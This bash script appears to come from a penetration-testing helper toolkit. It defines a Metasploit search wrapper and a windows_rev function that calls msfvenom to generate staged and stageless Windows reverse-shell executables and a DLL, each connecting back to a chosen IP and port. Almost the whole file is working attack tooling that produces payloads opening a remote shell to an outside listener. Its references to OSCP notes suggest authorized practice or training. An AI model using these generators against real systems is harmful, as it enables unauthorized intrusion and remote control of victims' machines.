#!/bin/bash


# TODO: Doc
function msfsearch() {
    msfconsole -q -x "search $@; exit"
}

# Description: Generate a reverse shell using msfvenom
# Usage: windows_rev <-p PORT> <-a x86|x64|dll> [-i IP]
# Arguments:
#   -p|--port:      Port number for the reverse shell
#   -a|--arch:      Architecture for the reverse shell (x86, x64, dll)
#     -i|--ip:      IP address for the reverse shell
# Example:
#   windows_rev -p 4444 -a x86
# References:
#   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
#   - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
# TODO: extends to Linux
function windows_rev() {
    local ip=$(_get_default_network_interface_ip)
    local port="$_swiss_windows_rev_default_port"
    local arch="$_swiss_windows_rev_default_arch"
    local generate_stage=$_swiss_windows_rev_generate_stage
    local generate_stageless=$_swiss_windows_rev_generate_stageless

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--arch)
                arch="$2"
                shift 2
                ;;
            -h|--help)
                _help
                return 0
                ;;
            *)
                swiss_logger error "[e] Invalid option: $1. Check with -h, --help"
                return 1
                ;;
        esac
    done

    if [[ -z "$port" || -z "$arch" || -z "$ip" ]]; then
        swiss_logger error "[e] Port, IP, and architecture must be specified"
        swiss_logger
        return 1
    fi

    swiss_logger info "[i] Creating binaries using ip = $ip, port = $port, arch = $arch"

    case $arch in
        x86)
            if [[ $generate_stage = true ]]; then
                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage.exe
            fi

            if [[ $generate_stageless = true ]]; then
                msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stageless.exe
            fi
            ;;
        x64)
            if [[ $generate_stage = true ]]; then
                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stage.exe
            fi

            if [[ $generate_stageless = true ]]; then
                msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stageless.exe
            fi
            ;;
        dll)
            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o reverse.dll
            ;;
        *)
            swiss_logger error "[e] Invalid architecture: $arch. Only x86, x64, and dll are supported."
            return 1
            ;;
    esac
}